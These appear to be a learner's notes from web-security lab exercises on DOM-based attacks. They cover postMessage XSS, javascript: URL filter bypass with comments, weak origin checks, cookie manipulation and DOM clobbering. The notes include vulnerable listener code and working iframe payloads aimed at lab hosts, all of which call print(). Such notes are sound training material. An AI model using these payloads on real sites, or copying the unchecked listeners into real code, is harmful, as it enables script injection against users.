# DOM based manipulation
## web messages can be used as a source

If a page handles incoming web messages in an unsafe way, for example, by *not
verifying the origin of messages* correctly in the event listener, properties
and functions that are called by the event listener can potentially become
sinks.

### DOM XSS using web messages

```js
<script>
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
})
</script>
```

Payload: `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`

`postMessage()` enables cross-origin communication between Window objects;
between a page and a pop-up that it spawned, or between a page and an iframe.

it sends a `message` *event* to the specified window: `window.postMessage(message)`

`contentWindow` property returns the Window object of an HTMLIFrameElement.

in the case of this payload:

`'*'` is used as the target origin, which means that the message can be
received by any domain.

`postMessage()` sends a web message to the home page. the event listener adds
it to the DOM.

### using JavaScript URL

JS URL `javascript:`

```js
<script>
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
</script>
```

`onload="this.contentWindow.postMessage('javascript:print()//http:','*')"`

comments (//) can be used to mask or bypass URL validation.

the script above is vulnerable, so if we have http anywhere in the payload, it
will be sent to the location.href. but there, that part of the payload
containing http is considered to be commented.

## Origin verification

origin verifications could be flawed.

`indexOf()`, `startWith()`, `endsWith()` methods are unsafe.

```js
window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
    document.body.appendChild(iframe);
    try {
        d = JSON.parse(e.data);
    } catch(e) {
        return;
    }
    switch(d.type) {
        case "page-load":
            ACMEplayer.element.scrollIntoView();
            break;
        case "load-channel":
            ACMEplayer.element.src = d.url;
            break;
        case "player-height-changed":
            ACMEplayer.element.style.width = d.width + "px";
            ACMEplayer.element.style.height = d.height + "px";
            break;
    }
}, false);
```

when `case` is "load-channel" is interesting.

`<iframe src=https://0a9700d40387d3bc82b4ab24000600c3.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`

## cookie manipulation

Some DOM-based vulnerabilities allow attackers to manipulate data that they do
not typically control. This transforms normally-safe data types, such as
cookies.

An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will set an arbitrary value in the user's cookie.

`<script>
document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>`

`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">`

e iframe loads for the first time, the browser temporarily opens the malicious
URL, which is then saved as the value of the lastViewedProduct cookie. The
onload event handler ensures that the victim is then immediately redirected to
the home page.

* When the iframe is first loaded, window.x is undefined (or not set), so the
  condition if(!window.x) evaluates to true.
* The src of the iframe is immediately changed (or reloaded) to the specified
  URL ('https://YOUR-LAB-ID.web-security-academy.net'), triggering a second
  load of the iframe.
* After reloading, window.x is now 1, so the next time the onload event fires,
  the if(!window.x) condition will be false, preventing further reloads.

## DOM clobbering

inject HTML into a page to manipulate the DOM and ultimately change the
behavior of JavaScript on the page. useful in cases where XSS is not possible,
but you can control some HTML on a page where the attributes id or name are
whitelisted by the HTML filter.

The most common form of DOM clobbering uses an anchor element to overwrite a
global variable, which is then used by the application in an unsafe way.